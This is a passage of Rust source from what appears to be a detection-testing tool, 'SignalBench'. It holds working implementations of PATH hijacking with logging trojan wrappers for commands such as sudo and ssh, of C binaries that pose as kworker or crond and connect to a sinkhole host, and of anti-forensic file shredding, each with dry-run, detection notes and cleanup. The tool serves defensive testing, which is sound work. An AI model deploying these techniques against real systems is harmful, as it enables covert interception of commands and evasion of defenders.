                                serde_json::from_str::<serde_json::Value>(&content)
                            {
                                if let Some(files) = artifacts_data["files_modified"].as_array() {
                                    info!("Restoring {} history files from backup...", files.len());

                                    let mut restored_count = 0;
                                    let mut failed_count = 0;

                                    for file_info in files {
                                        let original_path =
                                            file_info["path"].as_str().unwrap_or("");
                                        let backup_path =
                                            file_info["backup_path"].as_str().unwrap_or("");
                                        let perms_str =
                                            file_info["permissions"].as_str().unwrap_or("600");

                                        if original_path.is_empty() || backup_path.is_empty() {
                                            continue;
                                        }

                                        if !Path::new(backup_path).exists() {
                                            warn!("Backup file not found: {backup_path}");
                                            failed_count += 1;
                                            continue;
                                        }

                                        // Restore the file
                                        match fs::copy(backup_path, original_path) {
                                            Ok(_) => {
                                                info!("  [OK] Restored: {original_path}");

                                                // Restore original permissions
                                                if let Ok(perms_mode) =
                                                    u32::from_str_radix(perms_str, 8)
                                                {
                                                    let _ = fs::set_permissions(
                                                        original_path,
                                                        fs::Permissions::from_mode(perms_mode),
                                                    );
                                                    info!("    Permissions set to: {perms_str}");
                                                }

                                                // Verify restoration
                                                if let Ok(metadata) = fs::metadata(original_path) {
                                                    let current_perms =
                                                        metadata.permissions().mode();
                                                    info!("    Verification: file exists, mode: {current_perms:o}");
                                                }

                                                restored_count += 1;
                                            }
                                            Err(e) => {
                                                warn!("  [FAIL] Failed to restore {original_path}: {e}");
                                                failed_count += 1;
                                            }
                                        }
                                    }

                                    info!("\n=== Restoration Summary ===");
                                    info!("Files restored: {restored_count}");
                                    info!("Files failed: {failed_count}");
                                }
                            }
                        }
                        Err(e) => {
                            warn!("Failed to read artifacts JSON: {e}");
                        }
                    }
                }
            }

            // Remove backup directory and all artifacts
            for artifact in artifacts {
                let artifact_path = Path::new(artifact);

                if artifact_path.exists() {
                    if artifact_path.is_dir() {
                        match fs::remove_dir_all(artifact) {
                            Ok(_) => info!("Removed backup directory: {artifact}"),
                            Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                        }
                    } else {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed artifact: {artifact}"),
                            Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                        }
                    }
                }
            }

            info!("=== Shell History Restoration Complete ===");
            Ok(())
        })
    }
}

pub struct ModifyEnvironmentVariable {}

#[async_trait]
impl AttackTechnique for ModifyEnvironmentVariable {
    fn info(&self) -> Technique {
        Technique {
            id: "T1574.007".to_string(),
            name: "Path Interception with Trojan Binaries".to_string(),
            description: "Creates REAL trojan binaries that hijack PATH to intercept common commands (ls, ps, whoami, sudo, ssh, curl, wget). Each trojan logs execution details (timestamp, user, PID, arguments) before calling the real binary, generating extensive file execution telemetry for XDR/EDR detection. More trojans = more detectable file executions.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "hijack_directory".to_string(),
                    description: "Directory to store trojan binaries".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_path_hijack".to_string()),
                },
                TechniqueParameter {
                    name: "intercept_log".to_string(),
                    description: "Log file for intercepted command executions (session_id will be appended)".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_path_intercept".to_string()),
                },
            ],
            detection: "Monitor for: PATH modifications, creation of binaries in /tmp or unusual locations, execution of ls/ps/whoami/sudo/ssh/curl/wget from non-standard directories (/tmp), multiple suspicious binary creations with execute permissions, shell scripts wrapping system binaries, and file access patterns to intercept logs.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use std::os::unix::fs::PermissionsExt;
            use tokio::process::Command;
            use uuid::Uuid;

            // Generate unique session ID for this execution
            let session_id = Uuid::new_v4().to_string()[..8].to_string();

            let hijack_dir = config
                .parameters
                .get("hijack_directory")
                .unwrap_or(&"/tmp/signalbench_path_hijack".to_string())
                .clone();

            let intercept_log_base = config
                .parameters
                .get("intercept_log")
                .unwrap_or(&"/tmp/signalbench_path_intercept".to_string())
                .clone();

            // Append session_id to log file name
            let intercept_log = format!("{intercept_log_base}_{session_id}.log");

            if dry_run {
                info!("[DRY RUN] Would create trojan binaries in {hijack_dir} and hijack PATH");
                info!("[DRY RUN] Session ID: {session_id}");
                info!("[DRY RUN] Would create trojans for: ls, ps, whoami, sudo, ssh, curl, wget");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: Would create 7 trojan binaries (session: {session_id})"
                    ),
                    artifacts: vec![hijack_dir, intercept_log],
                    cleanup_required: false,
                });
            }

            // Create the hijack directory
            fs::create_dir_all(&hijack_dir)
                .map_err(|e| format!("Failed to create hijack directory: {e}"))?;
            info!("Created trojan directory: {hijack_dir}");
            info!("Session ID: {session_id}");

            // Expanded list of trojans - now includes sudo, ssh, curl, wget
            let trojans = vec!["ls", "ps", "whoami", "sudo", "ssh", "curl", "wget"];
            let mut trojan_specs = Vec::new();

            for cmd_name in &trojans {
                // Find the real binary path
                let which_output = Command::new("which")
                    .arg(cmd_name)
                    .output()
                    .await
                    .map_err(|e| format!("Failed to find {cmd_name}: {e}"))?;

                if !which_output.status.success() {
                    warn!("Could not find real binary for {cmd_name}, skipping");
                    continue;
                }

                let real_path = String::from_utf8_lossy(&which_output.stdout)
                    .trim()
                    .to_string();

                // Verify the real binary path is not our hijack directory
                if real_path.starts_with(&hijack_dir) {
                    warn!("Real binary path for {cmd_name} is in hijack directory, skipping");
                    continue;
                }

                trojan_specs.push((*cmd_name, real_path));
            }

            let mut created_trojans = Vec::new();

            for (cmd_name, real_path) in &trojan_specs {
                let trojan_path = format!("{hijack_dir}/{cmd_name}");

                // Create the trojan script with enhanced logging
                let trojan_script = format!(
                    r#"#!/bin/sh
# SignalBench PATH Hijacking Trojan - GoCortex.io v1.5.13
# This trojan logs execution details and then calls the real binary
# Session ID: {session_id}

LOG_FILE="{intercept_log}"
TIMESTAMP=$(date -Iseconds)
LOGUSER=${{USER:-$(id -un)}}
PID=$$

# Enhanced logging: timestamp, user, PID, command, and all arguments
echo "[$TIMESTAMP] User: $LOGUSER | PID: $PID | Command: {cmd_name} $*" >> "$LOG_FILE"

# Execute the real binary with all arguments and preserve exit code
{real_path} "$@"
exit $?
"#
                );

                let mut trojan_file = File::create(&trojan_path)
                    .map_err(|e| format!("Failed to create trojan {cmd_name}: {e}"))?;

                trojan_file
                    .write_all(trojan_script.as_bytes())
                    .map_err(|e| format!("Failed to write trojan {cmd_name}: {e}"))?;

                // Make the trojan executable
                let metadata = fs::metadata(&trojan_path)
                    .map_err(|e| format!("Failed to get metadata for {cmd_name}: {e}"))?;
                let mut permissions = metadata.permissions();
                permissions.set_mode(0o755);
                fs::set_permissions(&trojan_path, permissions)
                    .map_err(|e| format!("Failed to set permissions for {cmd_name}: {e}"))?;

                created_trojans.push(trojan_path.clone());
                info!("Created trojan binary: {trojan_path}");
            }

            // Initialise the intercept log with session information
            let mut log_file = File::create(&intercept_log)
                .map_err(|e| format!("Failed to create intercept log: {e}"))?;
            writeln!(
                log_file,
                "=== SignalBench PATH Interception Log (GoCortex.io v1.5.13) ==="
            )
            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Session ID: {session_id}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(
                log_file,
                "Session started: {}",
                chrono::Local::now().to_rfc3339()
            )
            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(
                log_file,
                "Intercepted binaries: ls, ps, whoami, sudo, ssh, curl, wget"
            )
            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;

            // Get original PATH
            let original_path =
                std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".to_string());
            info!("Original PATH: {original_path}");

            // Document PATH hijacking configuration
            let new_path = format!("{hijack_dir}:{original_path}");
            writeln!(log_file, "=== PATH Hijacking Configuration ===")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Trojan directory: {hijack_dir}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Original PATH: {original_path}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "Hijacked PATH: {new_path}")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "To test PATH interception, execute:")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  export PATH={hijack_dir}:$PATH")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ls -la")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ps aux")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  whoami")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  sudo -l")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  ssh user@example.com")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  curl https://example.com")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  wget https://example.com/file.txt")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "All intercepted commands will be logged with:")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Timestamp (ISO 8601)")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Calling user")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Process ID (PID)")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file, "  - Full command line with arguments")
                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;

            drop(log_file); // Close the log file

            // Fire phase: invoke each hijacked command through a PATH-modified
            // shell so the trojan wrappers actually execute. Without this the
            // trojans only exist on disk and never produce process telemetry.
            let invoke_lines: Vec<String> = trojan_specs
                .iter()
                .map(|(name, _)| match *name {
                    "ls" => "ls -la /tmp >/dev/null 2>&1".to_string(),
                    "ps" => "ps aux >/dev/null 2>&1".to_string(),
                    "whoami" => "whoami >/dev/null 2>&1".to_string(),
                    "sudo" => "sudo -n true >/dev/null 2>&1 || true".to_string(),
                    "ssh" => "ssh -V >/dev/null 2>&1 || true".to_string(),
                    "curl" => "curl --version >/dev/null 2>&1 || true".to_string(),
                    "wget" => "wget --version >/dev/null 2>&1 || true".to_string(),
                    other => format!("{other} --help >/dev/null 2>&1 || true"),
                })
                .collect();

            let invoke_script = format!(
                "export PATH={hijack_dir}:$PATH; {}",
                invoke_lines.join("; ")
            );

            info!("Invoking hijacked commands through PATH-modified shell");
            match Command::new("/bin/sh")
                .arg("-c")
                .arg(&invoke_script)
                .output()
                .await
            {
                Ok(out) => {
                    let exit = out.status.code().unwrap_or(-1);
                    info!(
                        "Hijacked command invocation completed (exit={exit}, {} commands)",
                        invoke_lines.len()
                    );
                }
                Err(e) => warn!("Failed to invoke hijacked commands: {e}"),
            }

            info!("PATH hijacking executed - trojans intercepted commands via PATH={hijack_dir}:$PATH");
            info!("PATH hijacking telemetry generated:");
            info!(
                "  - {} trojan binaries created (ls, ps, whoami, sudo, ssh, curl, wget)",
                created_trojans.len()
            );
            info!("  - PATH hijacking configured: {new_path}");
            info!("  - Enhanced logging: timestamp, user, PID, full arguments");
            info!("  - Interception ready - commands will be logged when PATH is modified");
            info!("  - Session ID: {session_id}");
            info!("  - Interception log: {intercept_log}");

            let trojan_count = created_trojans.len();
            let mut all_artifacts = created_trojans;
            all_artifacts.push(hijack_dir.clone());
            all_artifacts.push(intercept_log.clone());

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "Successfully created {trojan_count} trojan binaries (ls, ps, whoami, sudo, ssh, curl, wget) for PATH hijacking. Session: {session_id}. Interception log: {intercept_log}"
                ),
                artifacts: all_artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                let artifact_path = Path::new(artifact);

                if artifact_path.is_dir() {
                    match fs::remove_dir_all(artifact) {
                        Ok(_) => info!("Removed trojan directory: {artifact}"),
                        Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                    }
                } else if artifact_path.exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
pub struct MasqueradingAsCrond {}

#[async_trait]
impl AttackTechnique for MasqueradingAsCrond {
    // Compiles renamed C binaries to masquerade as crond; gcc is the core
    // mechanism and the technique hard-fails (return Err) without it.
    fn required_tools(&self) -> Vec<&'static str> {
        vec!["gcc"]
    }

    fn info(&self) -> Technique {
        Technique {
            id: "T1036.003".to_string(),
            name: "Masquerading as Linux System Process".to_string(),
            description: "Compiles REAL C binaries with misleading names that masquerade as legitimate system processes including [kworker/0:0], systemd-journald, and crond. Uses prctl(PR_SET_NAME) for process name spoofing so processes appear as genuine system services in ps output. Each binary sleeps for 10 seconds whilst masquerading. Executes binaries, verifies spoofed names appear in ps aux output, and provides complete cleanup including process termination and binary/source removal.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![],
            detection: "Monitor for C compilation (gcc/clang) of small binaries, execution of binaries from /tmp with system-like names, prctl() system calls for PR_SET_NAME, processes in ps output with suspicious parent processes or working directories, and binaries named after kernel workers or system daemons in unusual locations.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, _config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            let id = Uuid::new_v4().simple().to_string();
            let work_dir = format!("/tmp/signalbench_masquerade_{id}");

            if dry_run {
                info!("[DRY RUN] Would compile REAL C binaries with process name spoofing:");
                info!("[DRY RUN]   - [kworker/0:0] (kernel worker spoofing)");
                info!("[DRY RUN]   - systemd-journald (systemd service spoofing)");
                info!("[DRY RUN]   - crond (cron daemon spoofing)");
                info!("[DRY RUN]   - Uses prctl(PR_SET_NAME) for process name manipulation");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would compile and execute REAL masquerading binaries"
                        .to_string(),
                    artifacts: vec![work_dir],
                    cleanup_required: false,
                });
            }

            info!("Creating process masquerading binaries in {work_dir}");

            fs::create_dir_all(&work_dir)
                .map_err(|e| format!("Failed to create work directory: {e}"))?;

            let mut artifacts = vec![work_dir.clone()];
            let mut binaries_created = Vec::new();
            let mut running_pids = Vec::new();

            // The C source below extends the masquerade with two activities a
            // real kernel worker, journald, or crond would not perform: writing
            // to a user-path stage file and initiating a TCP SYN to a remote
            // host. These break the invariants behavioural rules rely on (e.g.
            // "kworker never opens a user-space socket") so detection has a
            // signal beyond the spoofed ps name alone.
            let c_source_template = |process_name: &str| -> String {
                format!(
                    "#include <stdio.h>\n\
                    #include <stdlib.h>\n\
                    #include <unistd.h>\n\
                    #include <string.h>\n\
                    #include <fcntl.h>\n\
                    #include <sys/prctl.h>\n\
                    #include <sys/socket.h>\n\
                    #include <netinet/in.h>\n\
                    #include <arpa/inet.h>\n\
                    \n\
                    int main(int argc, char **argv) {{\n\
                        prctl(PR_SET_NAME, \"{process_name}\", 0, 0, 0);\n\
                        \n\
                        if (argc > 1) {{\n\
                            int fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0644);\n\
                            if (fd >= 0) {{\n\
                                const char *msg = \"{process_name}:stage\\n\";\n\
                                ssize_t n = write(fd, msg, strlen(msg));\n\
                                (void)n;\n\
                                close(fd);\n\
                            }}\n\
                        }}\n\
                        \n\
                        if (argc > 2) {{\n\
                            int s = socket(AF_INET, SOCK_STREAM, 0);\n\
                            if (s >= 0) {{\n\
                                int flags = fcntl(s, F_GETFL, 0);\n\
                                fcntl(s, F_SETFL, flags | O_NONBLOCK);\n\
                                struct sockaddr_in addr;\n\
                                memset(&addr, 0, sizeof(addr));\n\
                                addr.sin_family = AF_INET;\n\
                                addr.sin_port = htons(80);\n\
                                if (inet_aton(argv[2], &addr.sin_addr) != 0) {{\n\
                                    connect(s, (struct sockaddr *)&addr, sizeof(addr));\n\
                                }}\n\
                                close(s);\n\
                            }}\n\
                        }}\n\
                        \n\
                        sleep(10);\n\
                        return 0;\n\
                    }}\n"
                )
            };

            let binaries = vec![
                ("[kworker/0:0]", "kworker"),
                ("systemd-journald", "systemd_journald"),
                ("crond", "crond"),
            ];

            info!(
                "Compiling {} C binaries with process name spoofing",
                binaries.len()
            );

            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;

            for (spoof_name, safe_filename) in &binaries {
                let source_file = format!("{work_dir}/{safe_filename}.c");
                let binary_file = format!("{work_dir}/{safe_filename}");
                let stage_file = format!("{work_dir}/.stage-{safe_filename}");

                let source_code = c_source_template(spoof_name);
                fs::write(&source_file, source_code.as_bytes())
                    .map_err(|e| format!("Failed to write C source for {spoof_name}: {e}"))?;
                artifacts.push(source_file.clone());

                info!("Compiling {spoof_name} binary with gcc");
                let compile_output = Command::new("gcc")
                    .args([&source_file, "-o", &binary_file, "-std=c99"])
                    .output()
                    .await
                    .map_err(|e| format!("Failed to compile {spoof_name}: {e}"))?;

                if !compile_output.status.success() {
                    let stderr = String::from_utf8_lossy(&compile_output.stderr);
                    return Err(format!("Compilation failed for {spoof_name}: {stderr}"));
                }

                artifacts.push(binary_file.clone());
                artifacts.push(stage_file.clone());
                binaries_created.push(format!("{safe_filename} -> {spoof_name}"));

                info!(
                    "Executing masquerading binary: {safe_filename} (will appear as {spoof_name})"
                );
                let child = Command::new(&binary_file)
                    .arg(&stage_file)
                    .arg(&sinkhole_ip)
                    .spawn()
                    .map_err(|e| format!("Failed to execute {spoof_name}: {e}"))?;

                let pid = child.id().ok_or("Failed to get PID")?;
                running_pids.push(pid);
                artifacts.push(format!("pid_{pid}"));

                info!(
                    "[OK] Binary running with PID {pid}, spoofing as {spoof_name}, stage {stage_file}, connect {sinkhole_ip}:80"
                );

                tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            }

            info!("Verifying process masquerading in ps output");
            let ps_output = Command::new("ps")
                .args(["aux"])
                .output()
                .await
                .map_err(|e| format!("Failed to run ps: {e}"))?;

            let ps_text = String::from_utf8_lossy(&ps_output.stdout);
            let mut verified_count = 0;

            for (spoof_name, _) in &binaries {
                if ps_text.contains(spoof_name) {
                    info!("[OK] Verified: '{spoof_name}' appears in ps output");
                    verified_count += 1;
                } else {
                    warn!("[WARN] Warning: '{spoof_name}' not found in ps output");
                }
            }

            info!(
                "Masquerading complete: {} binaries running, {} verified in ps",
                running_pids.len(),
                verified_count
            );

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully created and executed {} masquerading binaries ({} verified): {} (session: {})", binaries_created.len(), verified_count, binaries_created.join(", "), id),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            for artifact in artifacts {
                if artifact.starts_with("pid_") {
                    let pid_str = artifact.trim_start_matches("pid_");
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        info!("Terminating masquerading process PID {pid}");
                        Command::new("kill")
                            .args(["-9", &pid.to_string()])
                            .output()
                            .await
                            .ok();

                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    }
                } else if Path::new(artifact).is_dir() {
                    match fs::remove_dir_all(artifact) {
                        Ok(_) => info!("Removed masquerading directory: {artifact}"),
                        Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                    }
                } else if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct FileDeletion {}

#[async_trait]
impl AttackTechnique for FileDeletion {
    fn info(&self) -> Technique {
        Technique {
            id: "T1070.004".to_string(),
            name: "File Deletion".to_string(),
            description: "Creates test files in /tmp/signalbench_deletion_test/, backs them up to /tmp/signalbench_deletion_backup/ BEFORE deletion, then demonstrates multiple secure deletion methods including shred -uvz -n 3 (3 overwrite passes), rm -f, and wipe (if available). Simulates log tampering by creating and deleting entries in test log files. Demonstrates anti-forensics metadata clearing techniques. FULLY REVERSIBLE with complete restoration from backups and cleanup of all test files.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "test_files_count".to_string(),
                    description: "Number of test files to create for deletion testing (default: 10)".to_string(),
                    required: false,
                    default: Some("10".to_string()),
                },
                TechniqueParameter {
                    name: "use_shred".to_string(),
                    description: "Use shred for secure deletion (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "simulate_log_tampering".to_string(),
                    description: "Create and delete test log files (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for shred command execution, unusual deletion of log files, metadata manipulation operations, rapid file creation/deletion patterns, access to /var/log/ with write permissions, and systematic file destruction patterns. Watch for tools that overwrite files before deletion.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            let test_files_count = config
                .parameters
                .get("test_files_count")
                .unwrap_or(&"10".to_string())
                .parse::<usize>()
                .unwrap_or(10)
                .min(50);

            let use_shred = config
                .parameters
                .get("use_shred")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            let simulate_log_tampering = config
                .parameters
                .get("simulate_log_tampering")
                .unwrap_or(&"true".to_string())
                .to_lowercase()
                == "true";

            let session_id = Uuid::new_v4().to_string().replace("-", "");
            let test_dir = format!("/tmp/signalbench_deletion_test_{session_id}");
            let backup_dir = format!("/tmp/signalbench_deletion_backup_{session_id}");
            let log_file = format!("/tmp/signalbench_deletion_{session_id}.log");

            if dry_run {
                info!("[DRY RUN] Would demonstrate file deletion techniques:");
                info!("[DRY RUN]   Test files: {test_files_count}");
                info!("[DRY RUN]   Use shred: {use_shred}");
                info!("[DRY RUN]   Log tampering: {simulate_log_tampering}");
                info!("[DRY RUN]   Test directory: {test_dir}");
                info!("[DRY RUN]   Backup directory: {backup_dir}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would demonstrate secure file deletion with shred, rm, and log tampering".to_string(),
                    artifacts: vec![test_dir, backup_dir, log_file],
                    cleanup_required: false,
                });
            }

            info!("Starting file deletion demonstration (Session: {session_id})...");

            let mut log =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;

            writeln!(log, "=== SignalBench File Deletion Demonstration ===").unwrap();
            writeln!(log, "Session ID: {session_id}").unwrap();
            writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log).unwrap();

            let artifacts = vec![test_dir.clone(), backup_dir.clone(), log_file.clone()];

            // Create test directory and backup directory
            info!("Creating test directory: {test_dir}");
            fs::create_dir_all(&test_dir)
                .map_err(|e| format!("Failed to create test directory: {e}"))?;

            fs::create_dir_all(&backup_dir)
                .map_err(|e| format!("Failed to create backup directory: {e}"))?;

            // Phase 1: Create test files with sensitive-looking names
            info!("Phase 1: Creating {test_files_count} test files...");
            writeln!(log, "=== Phase 1: Test File Creation ===").unwrap();

            let sensitive_names = [
                "credentials.txt",
                "passwords.db",
                "secret_key.pem",
                "api_tokens.conf",
                "sensitive_data.sql",
                "user_passwords.txt",
                "ssh_private_key",
                "database_backup.sql",
                "company_secrets.txt",
                "access_tokens.json",
            ];

            let mut created_files = Vec::new();
            for i in 0..test_files_count {
                let file_name = if i < sensitive_names.len() {
                    sensitive_names[i]
                } else {
                    &format!("sensitive_file_{i}.txt")
                };

                let file_path = format!("{test_dir}/{file_name}");
                let content = format!(
                    "SENSITIVE TEST DATA - Session {}\nFile: {}\nCreated: {}\nThis is test data for file deletion demonstration.\nPassword: test_password_{}\nAPI_KEY: FAKE_KEY_{}\n",
                    session_id,
                    file_name,
                    chrono::Local::now(),
                    i,
                    i
                );

                fs::write(&file_path, content.as_bytes())
                    .map_err(|e| format!("Failed to create test file: {e}"))?;

                created_files.push(file_path.clone());
                writeln!(log, "Created: {file_name}").unwrap();
            }

            info!("Created {} test files", created_files.len());
            writeln!(log, "Total files created: {}", created_files.len()).unwrap();
            writeln!(log).unwrap();

            // Phase 2: Backup test files BEFORE deletion
            info!("Phase 2: Backing up test files to {backup_dir}...");
            writeln!(log, "=== Phase 2: File Backup ===").unwrap();

            for file_path in &created_files {
                let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
                let backup_path = format!("{backup_dir}/{file_name}");

                fs::copy(file_path, &backup_path)
                    .map_err(|e| format!("Failed to backup file: {e}"))?;

                writeln!(log, "Backed up: {file_name} -> {backup_path}").unwrap();
            }

            info!("Backed up {} files", created_files.len());
            writeln!(log).unwrap();

            // Phase 3: Demonstrate deletion methods
            info!("Phase 3: Demonstrating file deletion methods...");
            writeln!(log, "=== Phase 3: File Deletion Methods ===").unwrap();

            let mut deletion_results = Vec::new();
            let force_mode = config.force;

            if force_mode {
                info!("[T1070.004] [FORCE] Force mode - will attempt ALL deletion methods (shred, wipe, rm) for each file");
                writeln!(log, "[FORCE] Force mode enabled - attempting ALL deletion methods for maximum telemetry").unwrap();
            }

            // Check if shred is available
            let shred_available = Command::new("which")
                .arg("shred")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false);

            writeln!(log, "shred available: {shred_available}").unwrap();

            // Check if wipe is available
            let wipe_available = Command::new("which")
                .arg("wipe")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false);

            writeln!(log, "wipe available: {wipe_available}").unwrap();
            writeln!(log).unwrap();

            // Delete files using different methods
            // Force mode: run ALL methods for each file (maximum telemetry)
            // Normal mode: cycle between methods
            for (idx, file_path) in created_files.iter().enumerate() {
                let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();

                // Force mode: attempt ALL deletion methods for maximum telemetry
                // (each method will fail after the first succeeds, but the ATTEMPT generates detection)
                let use_shred_for_file = if force_mode {
                    (use_shred && shred_available) || force_mode
                } else {
                    idx % 3 == 0 && use_shred && shred_available
                };

                let use_wipe_for_file = if force_mode {
                    wipe_available || force_mode
                } else {
                    idx % 3 == 1 && wipe_available
                };

                let use_rm_for_file =
                    force_mode || idx % 3 == 2 || (!use_shred_for_file && !use_wipe_for_file);

                // Method 1: shred with 3 overwrite passes
                if use_shred_for_file {
                    if force_mode && !shred_available {
                        info!(
                            "[T1070.004] [FORCE] Attempting shred despite not being found on PATH"
                        );
                    }
                    info!("Shredding file: {file_name} (3 passes)");
                    writeln!(log, "Deleting {file_name} using shred -uvz -n 3").unwrap();

                    let shred_output = Command::new("shred")
                        .args(["-uvz", "-n", "3", file_path])
                        .output()
                        .await;

                    match shred_output {
                        Ok(output) if output.status.success() => {
                            deletion_results.push((
                                file_name.to_string(),
                                "shred -n 3".to_string(),
                                true,
                            ));
                            writeln!(log, "[OK] Successfully shredded: {file_name}").unwrap();
                        }
                        Ok(output) => {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            writeln!(log, "[FAIL] shred failed for {file_name}: {stderr}").unwrap();
                            deletion_results.push((
                                file_name.to_string(),
                                "shred -n 3".to_string(),
                                false,
                            ));
                        }
                        Err(e) => {
                            writeln!(log, "[FAIL] Failed to execute shred for {file_name}: {e}")
                                .unwrap();
                            deletion_results.push((
                                file_name.to_string(),
                                "shred -n 3".to_string(),
                                false,
                            ));
                        }
                    }
                }

                // Method 2: wipe (if available or force mode)
                if use_wipe_for_file {
                    if force_mode && !wipe_available {
                        info!(
                            "[T1070.004] [FORCE] Attempting wipe despite not being found on PATH"
                        );
                    }
                    info!("Wiping file: {file_name}");
                    writeln!(log, "Deleting {file_name} using wipe -f").unwrap();

                    let wipe_output = Command::new("wipe").args(["-f", file_path]).output().await;

                    match wipe_output {
                        Ok(output) if output.status.success() => {
                            deletion_results.push((
                                file_name.to_string(),
                                "wipe -f".to_string(),
                                true,
                            ));
                            writeln!(log, "[OK] Successfully wiped: {file_name}").unwrap();
                        }
                        Ok(_) => {
                            deletion_results.push((
                                file_name.to_string(),
                                "wipe -f".to_string(),
                                false,
                            ));
                            writeln!(log, "[FAIL] wipe failed for {file_name}").unwrap();
                        }
                        Err(e) => {
                            writeln!(log, "[FAIL] Failed to execute wipe for {file_name}: {e}")
                                .unwrap();
                            deletion_results.push((
                                file_name.to_string(),
                                "wipe -f".to_string(),
                                false,
                            ));
                        }
                    }
                }

                // Method 3: Simple rm -f
                if use_rm_for_file {
                    info!("Removing file: {file_name} (rm -f)");
                    writeln!(log, "Deleting {file_name} using rm -f").unwrap();

                    match fs::remove_file(file_path) {
                        Ok(_) => {
                            deletion_results.push((
                                file_name.to_string(),
